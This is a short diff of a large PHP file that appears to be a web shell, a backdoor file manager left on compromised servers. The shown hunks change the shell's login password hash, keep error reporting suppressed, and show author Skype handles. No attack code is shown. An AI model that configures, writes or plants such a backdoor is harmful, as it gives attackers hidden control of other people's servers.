@@ -2,7 +2,7 @@
 error_reporting(0);
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => '4rum',
-    'password' => 'c9a0537b8654ef5ddc468ad4c5037665',
+    'password' => 'e086f40054bc4ff6542efb34eec37ec8',
     'safe_mode' => '1',
     'login_page' => '4rum',
     'show_icons' => '1',
@@ -7038,4 +7038,5 @@ exit;
 #skype : sole.sad
 #skype : ehsan.invisible
 */
+
 ?>
